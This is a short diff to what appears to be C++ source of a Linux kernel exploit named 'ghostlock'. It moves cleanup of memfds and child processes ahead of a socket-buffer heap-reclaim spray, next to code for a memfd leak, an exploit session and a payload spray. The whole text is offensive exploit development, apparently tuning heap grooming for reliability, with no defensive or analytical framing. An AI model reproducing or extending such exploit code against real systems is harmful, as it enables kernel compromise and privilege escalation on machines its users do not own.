@@ -681,6 +681,13 @@ namespace ghostlock::support {
             pr_error("SYSCHK(close(memfd_leak)): %m\n");
         }
         session::g_exploit_session.heap.leak_memfd.reset();
+
+        for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
+            SYSCHK(close(prepare_ctx.memfds[i]));
+            prepare_ctx.memfds[i] = -1;
+            kill_child(prepare_ctx.childs[i]);
+        }
+
         for (int32_t i = 0; i < kernel::SKB_RECLAIM_SENDS; i++) {
             errno = 0;
             ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
@@ -691,11 +698,6 @@ namespace ghostlock::support {
         pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
         snitch.reset();
 
-        for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
-            SYSCHK(close(prepare_ctx.memfds[i]));
-            prepare_ctx.memfds[i] = -1;
-            kill_child(prepare_ctx.childs[i]);
-        }
 
         return base;
     }
